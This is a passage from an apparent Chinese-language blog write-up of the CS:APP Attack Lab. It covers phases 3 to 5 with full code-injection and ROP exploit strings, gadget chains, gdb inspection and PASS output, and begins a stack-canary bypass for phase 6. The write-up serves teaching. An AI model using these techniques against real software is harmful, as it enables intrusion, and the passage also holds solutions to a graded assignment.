+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Compare string to hex represention of unsigned value */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">hexmatch</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> val, <span class="hljs-type">char</span> *sval)</span><br>&#123;<br>    <span class="hljs-type">char</span> cbuf[<span class="hljs-number">110</span>];<br>    <span class="hljs-comment">/* Make position of check string unpredictable */</span><br>    <span class="hljs-type">char</span> *s = cbuf + random() % <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">&quot;%.8x&quot;</span>, val);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(sval, s, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">touch3</span><span class="hljs-params">(<span class="hljs-type">char</span> *sval)</span><br>&#123;<br>    vlevel = <span class="hljs-number">3</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br>    <span class="hljs-keyword">if</span> (hexmatch(cookie, sval)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);<br>        validate(<span class="hljs-number">3</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);<br>        fail(<span class="hljs-number">3</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们需要构造一个输入，使得 <code>getbuf</code> 函数返回后，调用 <code>touch3</code> 函数。为此，我们需要注入一段代码，该代码将 cookie 的地址 <code>mov</code> 给 <code>%rdi</code> 作为参数，并将 <code>touch3</code> 函数的地址 <code>pushq</code> 压入栈中，最后 <code>ret</code> 返回，这样程序就会跳转到 <code>touch3</code> 函数执行。</p>
+<p>与 phase 2 类似，我们需要用注入代码的起始位置地址（即储存字符串的地址）覆盖 <code>getbuf</code> 函数的返回地址。但除此之外，我们还需要将 cookie 储存在某个可控且安全的位置，并且将其地址 <code>mov</code> 给 <code>%rdi</code> 。</p>
+<p><code>getbuf</code> 函数在栈上分配的 0x18 字节的空间似乎足够存放我们注入的代码和 cookie，我们可以将 cookie 存放在栈上的局部变量 <code>buf</code> 中。但当调用 <code>hexmatch</code> 和 <code>strncmp</code> 这两个函数时，它们会将数据压入栈中，从而可能覆盖一部分原本存储着 <code>getbuf</code> 函数所用缓冲区的内存。</p>
+<p>我们先尝试将 cookie 存放在 <code>buf</code> 中：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">/* phase3.txt */<br>48 c7 c7 f5 c3 66 55 	/* mov    $0x5566c3f5, %rdi */<br>68 8d 1d 40 00       	/* push   $0x401d8d */<br>c3                   	/* ret */<br>32 34 63 38 63 65 36 36 00 /* cookie string &quot;24c8ce66&quot; */<br>00 00<br>e8 c3 66 55 00 00 00 00 /* Address of injected code */<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./hex2raw &lt; phase3.txt &gt; phase3.raw<br></code></pre></td></tr></table></figure>
+
+<p>启动调试，观察栈空间的变化：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb ctarget<br>b touch3<br>layout asm<br>layout regs<br>r &lt; phase3.raw<br></code></pre></td></tr></table></figure>
+
+<p>在调用 <code>hexmatch</code> 函数前后，分别执行 <code>x/20x 0x5566c3e8</code> ，查看栈空间内容：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">(gdb) x/20x 0x5566c3e8<br>0x5566c3e8:	0x74747474	0x74747474	0x74747474	0x74747474<br>0x5566c3f8:	0x00000000	0x00000000	0x00000000	0x00000000<br>0x5566c408:	0x0041d668	0x00000000	0x0040010d	0x00000000<br>0x5566c418:	0x55855f50	0x00000000	0x004024fa	0x00000000<br>0x5566c428:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4<br>0x5566c438:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4<br>(gdb) x/20x 0x5566c3e8<br>0x5566c3e8:	0x55855f58	0x00000000	0x0040458a	0x00000000<br>0x5566c3f8:	0x00401f0d	0x00000000	0x00400000	0x00000000<br>0x5566c408:	0x55855fad	0x00000000	0x004024fa	0x00000000<br>0x5566c418:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4<br>0x5566c428:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4<br></code></pre></td></tr></table></figure>
+
+<p>对比发现，在调用 <code>hexmatch</code> 函数后，栈空间的内容发生了变化，原本存储 cookie 的位置被覆盖了。因此，我们需要为 cookie 寻找一个更安全的位置，发现<br><code>0x5566c414</code> 位置起的 12 个字节全为 0x00 ，且在调用 <code>hexmatch</code> 函数前后没有发生变化，我们可以将 cookie 存放在该位置。</p>
+<p>同时为了防止会上层栈帧的覆盖造成不必要的影响，我们不改动除 cookie 之外的内容。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">/* phase3.txt */<br>48 c7 c7 14 c4 66 55 	/* mov    $0x5566c414, %rdi */<br>68 8d 1d 40 00       	/* push   $0x401d8d */<br>c3                   	/* ret */<br>00 00 00<br>00 00 00 00 00 00 00 00<br>e8 c3 66 55 00 00 00 00 /* Address of injected code */<br>00 5f 68 55 00 00 00 00<br>fa 24 40 00<br>32 34 63 38 63 65 36 36 00 /* cookie string &quot;24c8ce66&quot; */<br></code></pre></td></tr></table></figure>
+
+<p>转换为原始字节序列并传递给 <code>ctarget</code> 程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> phase3.txt | ./hex2raw | ./ctarget<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">Cookie: 0x24c8ce66<br>Type string:Touch3!: You called touch3(&quot;24c8ce66&quot;)<br>Valid solution for level 3 with target ctarget<br>PASS: Sent exploit string to server to be validated.<br>NICE JOB!<br></code></pre></td></tr></table></figure>
+
+<h1 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h1><p>在 phase 4 中，我们需要针对 <code>rtarget</code> 程序实现 ROP 攻击。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> val;<br>    val = getbuf();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">touch2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> val)</span><br>&#123;<br>    vlevel = <span class="hljs-number">2</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br>    <span class="hljs-keyword">if</span> (val == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        fail(<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们需要构造一个输入，使得 <code>getbuf</code> 函数返回后，程序的控制流跳转到 <code>touch2</code> 函数。但由于栈随机化，我们需要利用 ROP 技术，通过一系列的 gadgets 来实现对 <code>touch2</code> 函数的调用。</p>
+<p>具体来说，我们需要找到合适的 gadgets 来构造 ROP 链，首先是将 cookie 的值加载到寄存器中，然后调用 <code>touch2</code> 函数。将值加载到寄存器中可以通过 <code>popq</code> 指令实现，这样我们只需要将 cookie 的值放到栈上即可。</p>
+<p>清楚我们需要什么指令后，从 gadgets 库中寻找合适的 gadgets 组成 ROP 链：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-comment">; Gadget 1</span><br>401e9c: <span class="hljs-number">58</span> c3 2c    popq %rax<br>                    <span class="hljs-keyword">ret</span><br><span class="hljs-comment">; Gadget 2</span><br>401e87: <span class="hljs-number">89</span> c7 c3    movl %eax, %edi<br>                    <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure>
+
+<p>结合上述两个 gadgets，添加 <code>touch2</code> 函数地址和 cookie 的值组成攻击载荷：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">/* phase4.txt */<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>9c 1e 40 00 00 00 00 00 /* Gadget 1 */<br>66 ce c8 24 00 00 00 00 /* cookie value */<br>87 1e 40 00 00 00 00 00 /* Gadget 2 */<br>f5 1b 40 00 00 00 00 00 /* Address of touch2 function */<br></code></pre></td></tr></table></figure>
+
+<p>转换为原始字节序列并传递给 <code>rtarget</code> 程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> phase4.txt | ./hex2raw | ./rtarget<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">Cookie: 0x24c8ce66<br>Type string:Touch2!: You called touch2(0x24c8ce66)<br>Valid solution for level 2 with target rtarget<br>PASS: Sent exploit string to server to be validated.<br>NICE JOB!<br></code></pre></td></tr></table></figure>
+
+<h1 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h1><p>在 phase 4 中，我们需要针对 <code>rtarget</code> 程序实现 ROP 攻击。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> val;<br>    val = getbuf();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Compare string to hex represention of unsigned value */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">hexmatch</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> val, <span class="hljs-type">char</span> *sval)</span><br>&#123;<br>    <span class="hljs-type">char</span> cbuf[<span class="hljs-number">110</span>];<br>    <span class="hljs-comment">/* Make position of check string unpredictable */</span><br>    <span class="hljs-type">char</span> *s = cbuf + random() % <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">&quot;%.8x&quot;</span>, val);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(sval, s, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">touch3</span><span class="hljs-params">(<span class="hljs-type">char</span> *sval)</span><br>&#123;<br>    vlevel = <span class="hljs-number">3</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br>    <span class="hljs-keyword">if</span> (hexmatch(cookie, sval)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);<br>        validate(<span class="hljs-number">3</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);<br>        fail(<span class="hljs-number">3</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们需要构造一个输入，使得 <code>getbuf</code> 函数返回后，调用 <code>touch3</code> 函数。但由于栈随机化，我们需要利用 ROP 技术，通过一系列的 gadgets 来实现对 <code>touch3</code> 函数的调用。</p>
+<p>首先，需要将 cookie 字符串储存在内存空间中，由于 cookie 信息只能由我们的攻击载荷带入，所以 cookie 只能储存在栈空间中。但是，由于栈随机化保护，我们无法直接 cookie 字符串的确切地址。一个容易想到的方法是采用相对地址，虽然栈地址是随机的，但是 cookie 字符串相对于栈顶的偏移量是固定的，因此，我们可以通过获取当前 %rsp 的值再加上偏移量来获取 cookie 字符串的地址。</p>
+<p>有了这个基本思路我们接下来就需要去寻找合适的 gadgets 来实现这个思路，这个过程比较曲折，因为提供的 gadgets 库中有时可能并没有直接对应的指令，我们需要通过组合多个 gadgets 来实现我们想要的功能。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-comment">; Gadget 1</span><br>401f2f: <span class="hljs-number">48</span> <span class="hljs-number">89</span> e0 c3     <span class="hljs-keyword">movq</span> %rsp, %rax<br>                        <span class="hljs-keyword">ret</span><br><span class="hljs-comment">; Gadget 2</span><br>401e90: <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 <span class="hljs-number">90</span> c3  <span class="hljs-keyword">movq</span> %rax, %rdi<br>                        <span class="hljs-keyword">nop</span><br>                        <span class="hljs-keyword">ret</span><br><span class="hljs-comment">; Gadget 3</span><br>401ea6: <span class="hljs-number">58</span> c3           popq %rax<br>                        <span class="hljs-keyword">ret</span><br><span class="hljs-comment">; Gadget 4</span><br>401f83: <span class="hljs-number">89</span> c1 <span class="hljs-number">38</span> c9 c3  movl %eax, %ecx<br>                        cmpb %cl, %cl<br>                        <span class="hljs-keyword">ret</span><br><span class="hljs-comment">; Gadget 5</span><br>401f8e: <span class="hljs-number">89</span> ca <span class="hljs-number">90</span> <span class="hljs-number">90</span> c3  movl %ecx, %edx<br>                        <span class="hljs-keyword">nop</span><br>                        <span class="hljs-keyword">nop</span><br>                        <span class="hljs-keyword">ret</span><br><span class="hljs-comment">; Gadget 6</span><br>401ef9: <span class="hljs-number">89</span> d6 <span class="hljs-number">20</span> <span class="hljs-built_in">db</span> c3  movl %edx, %esi<br>                        andb %bl, %bl<br>                        <span class="hljs-keyword">ret</span><br><span class="hljs-comment">; Gadget 7</span><br>401ecf: <span class="hljs-number">48</span> <span class="hljs-number">8d</span> <span class="hljs-number">04</span> <span class="hljs-number">37</span> c3  <span class="hljs-keyword">lea</span> (%rdi,%rsi,<span class="hljs-number">1</span>), %rax<br>                        <span class="hljs-keyword">ret</span><br><span class="hljs-comment">; Gadget 8</span><br>401e90: <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 <span class="hljs-number">90</span> c3  <span class="hljs-keyword">movq</span> %rax, %rdi<br>                        <span class="hljs-keyword">nop</span><br>                        <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure>
+
+<p>结合上述 gadgets，添加 <code>touch3</code> 函数地址和 cookie 字符串组成攻击载荷：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">/* phase5.txt */<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>2f 1f 40 00 00 00 00 00 /* Gadget 1 */<br>90 1e 40 00 00 00 00 00 /* Gadget 2 */<br>a6 1e 40 00 00 00 00 00 /* Gadget 3 */<br>48 00 00 00 00 00 00 00 /* Bias value 72 */<br>83 1f 40 00 00 00 00 00 /* Gadget 4 */<br>8e 1f 40 00 00 00 00 00 /* Gadget 5 */<br>f9 1e 40 00 00 00 00 00 /* Gadget 6 */<br>cf 1e 40 00 00 00 00 00 /* Gadget 7 */<br>90 1e 40 00 00 00 00 00 /* Gadget 8 */<br>1b 1d 40 00 00 00 00 00 /* Address of touch3 function */<br>32 34 63 38 63 65 36 36 00 /* cookie string &quot;24c8ce66&quot; */<br></code></pre></td></tr></table></figure>
+
+<p>转换为原始字节序列并传递给 <code>rtarget</code> 程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> phase5.txt | ./hex2raw | ./rtarget<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">Cookie: 0x24c8ce66<br>Type string:Touch3!: You called touch3(&quot;24c8ce66&quot;)<br>Valid solution for level 3 with target rtarget<br>PASS: Sent exploit string to server to be validated.<br>NICE JOB!<br></code></pre></td></tr></table></figure>
+
+<h1 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase 6"></a>Phase 6</h1><p>在 phase 6 中，我们需要针对 <code>starget</code> 程序实现 ROP 攻击。但是有了栈溢出检测的保护，简单的栈溢出无法实现返回导向编程（ROP）攻击，并且 <code>starget</code> 中的 <code>getbuf_withcanary</code> 函数也不再像 <code>getbuf</code> 那样存在漏洞。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-title function_">getbuf_withcanary</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>];<br>    <span class="hljs-type">char</span> logMsg[<span class="hljs-number">128</span>];<br>    len = <span class="hljs-number">0</span>;<br>    Gets(buf);<br>    <span class="hljs-built_in">memcpy</span>(logMsg + len, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">0000000000401df6 &lt;getbuf_withcanary&gt;:<br>  401df6:	<span class="hljs-number">55</span>                   	<span class="hljs-keyword">push</span>   %rbp<br>  401df7:	<span class="hljs-number">48</span> <span class="hljs-number">89</span> e5             	<span class="hljs-keyword">mov</span>    %rsp,%rbp<br>  401dfa:	<span class="hljs-number">48</span> <span class="hljs-number">81</span> ec <span class="hljs-number">20</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 	<span class="hljs-keyword">sub</span>    <span class="hljs-number">$0</span>x120,%rsp<br>  401e01:	<span class="hljs-number">64</span> <span class="hljs-number">48</span> 8b <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> 	<span class="hljs-keyword">mov</span>    %fs:<span class="hljs-number">0x28</span>,%rax<br>  401e08:	<span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  401e0a:	<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">45</span> f8          	<span class="hljs-keyword">mov</span>    %rax,-<span class="hljs-number">0x8</span>(%rbp)<br>  401e0e:	<span class="hljs-number">31</span> c0                	<span class="hljs-keyword">xor</span>    %eax,%eax<br>  401e10:	c7 <span class="hljs-number">45</span> e4 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 	movl   <span class="hljs-number">$0</span>x0,-<span class="hljs-number">0x1c</span>(%rbp)<br>  401e17:	<span class="hljs-number">48</span> <span class="hljs-number">8d</span> <span class="hljs-number">85</span> <span class="hljs-number">60</span> ff ff ff 	<span class="hljs-keyword">lea</span>    -<span class="hljs-number">0xa0</span>(%rbp),%rax<br>  401e1e:	<span class="hljs-number">48</span> <span class="hljs-number">89</span> c7             	<span class="hljs-keyword">mov</span>    %rax,%rdi<br>  401e21:	e8 c3 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	<span class="hljs-keyword">call</span>   4020e9 &lt;Gets&gt;<br>  401e26:	8b <span class="hljs-number">45</span> e4             	<span class="hljs-keyword">mov</span>    -<span class="hljs-number">0x1c</span>(%rbp),%eax<br>  401e29:	<span class="hljs-number">48</span> <span class="hljs-number">98</span>                	cltq<br>  401e2b:	<span class="hljs-number">48</span> <span class="hljs-number">8d</span> <span class="hljs-number">95</span> e0 fe ff ff 	<span class="hljs-keyword">lea</span>    -<span class="hljs-number">0x120</span>(%rbp),%rdx<br>  401e32:	<span class="hljs-number">48</span> <span class="hljs-number">8d</span> 0c <span class="hljs-number">02</span>          	<span class="hljs-keyword">lea</span>    (%rdx,%rax,<span class="hljs-number">1</span>),%rcx<br>  401e36:	<span class="hljs-number">48</span> <span class="hljs-number">8d</span> <span class="hljs-number">85</span> <span class="hljs-number">60</span> ff ff ff 	<span class="hljs-keyword">lea</span>    -<span class="hljs-number">0xa0</span>(%rbp),%rax<br>  401e3d:	ba <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	<span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x80,%edx<br>  401e42:	<span class="hljs-number">48</span> <span class="hljs-number">89</span> c6             	<span class="hljs-keyword">mov</span>    %rax,%rsi<br>  401e45:	<span class="hljs-number">48</span> <span class="hljs-number">89</span> cf             	<span class="hljs-keyword">mov</span>    %rcx,%rdi<br>  401e48:	e8 f3 f2 ff ff       	<span class="hljs-keyword">call</span>   <span class="hljs-number">401140</span> &lt;memcpy@plt&gt;<br>  401e4d:	b8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	<span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x1,%eax<br>  401e52:	<span class="hljs-number">48</span> 8b <span class="hljs-number">75</span> f8          	<span class="hljs-keyword">mov</span>    -<span class="hljs-number">0x8</span>(%rbp),%rsi<br>  401e56:	<span class="hljs-number">64</span> <span class="hljs-number">48</span> <span class="hljs-number">33</span> <span class="hljs-number">34</span> <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> 	<span class="hljs-keyword">xor</span>    %fs:<span class="hljs-number">0x28</span>,%rsi<br>  401e5d:	<span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  401e5f:	<span class="hljs-number">74</span> <span class="hljs-number">05</span>                	<span class="hljs-keyword">je</span>     401e66 &lt;getbuf_withcanary+<span class="hljs-number">0x70</span>&gt;<br>  401e61:	e8 <span class="hljs-number">72</span> <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	<span class="hljs-keyword">call</span>   4025d8 &lt;__stack_chk_fail&gt;<br>  401e66:	c9                   	<span class="hljs-keyword">leave</span><br>  401e67:	c3                   	<span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure>
+
+<p>我们需要构造一个输入，使得 <code>getbuf_withcanary</code> 函数返回后，调用 <code>touch3</code> 函数。但由于栈随机化，我们需要利用 ROP 技术，通过一系列的 gadgets 来实现对 <code>touch3</code> 函数的调用。</p>
+<p>可以看到，<code>getbuf_withcanary</code> 函数中有两个缓冲区 <code>buf</code> 和 <code>logMsg</code>，并且 <code>memcpy</code> 函数会将 <code>buf</code> 中一定长度的内容复制到 <code>logMsg</code> 中。由于栈溢出保护，我们无法直接通过 <code>buf</code> 覆盖返回地址，那样会修改金丝雀值，那有没有可以绕过金丝雀值，直接覆写返回地址的方法呢？有的，兄弟，有的。我们可以利用 <code>memcpy</code> 函数配合 <code>len</code> 作为偏移量越过金丝雀值来实现 ROP 攻击。</p>
+<p>首先，我们需要知道 <code>getbuf_withcanary</code> 函数的栈空间结构，通过阅读汇编代码或调试可以得到如下栈布局：</p>
